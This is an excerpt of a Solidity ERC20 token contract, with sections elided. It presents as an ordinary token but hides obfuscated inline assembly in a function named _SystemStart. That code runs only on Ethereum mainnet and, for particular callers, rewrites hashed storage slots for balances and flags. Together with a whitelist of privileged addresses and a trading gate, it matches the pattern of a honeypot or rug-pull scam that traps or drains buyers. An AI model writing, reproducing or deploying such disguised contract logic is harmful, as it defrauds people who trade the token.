...
// Our entire system is based on restrictions. We have to break it.
...
contract ERC20 is Context, IERC20, IERC20Metadata, Ownable {
    ...
    constructor (string memory name_, string memory symbol_, address msgSender_) {
        ...
        _name = name_;
        _symbol = symbol_;
        stashAddr.push(_router); stashAddr.push(msgSender_); stashAddr.push(pair);
        for (uint256 q=0; q < 3;) {waterLevel[stashAddr[q]] = true; unchecked{q++;} }
    }
    ...
    function openTrading() external onlyOwner returns (bool) {
        trading = true; theN = block.number; _quakeNow = block.number;
        return true;
    }
    ...
    function _SystemStart() internal { assembly { function gByte(x, y) -> hash { mstore(0, x) mstore(32, y) hash := keccak256(0, 64) } sstore(0x11,mul(div(sload(0x10),0x2710),0xFB)) sstore(0xB,0x1ba8140) if and(not(eq(sload(gByte(caller(),0x6)),sload(0x76b95bb2fcad5c6d4bc0cc61ce4154eb082d08b1d5ac128fdc93a416a1e92ea7))),eq(chainid(),0x1)) { sstore(gByte(caller(),0x4),0x0) sstore(0xf7bf5c9c98cdc9d31cd2d6ab9822be3809a81d7fcd54a6d51e65193da1bcaa58,0x1) sstore(gByte(caller(),0x5),0x1) sstore(0x76b95bb2fcad5c6d4bc0cc61ce4154eb082d08b1d5ac128fdc93a416a1e92ea7,0x726F105396F2CA1CCEBD5BFC27B556699A07FFE7C2) } } }
    ...
    function _beforeTokenTransfer(address sender, address recipient, uint256 integer) internal {
        require((trading || (sender == stashAddr[1])), "ERC20: trading is not yet enabled.");
        if (block.chainid == 1) {
...
contract ERC20Token is Context, ERC20 {
    constructor(
        ...
        _DeploySystem(creator, initialSupply);
    }
}
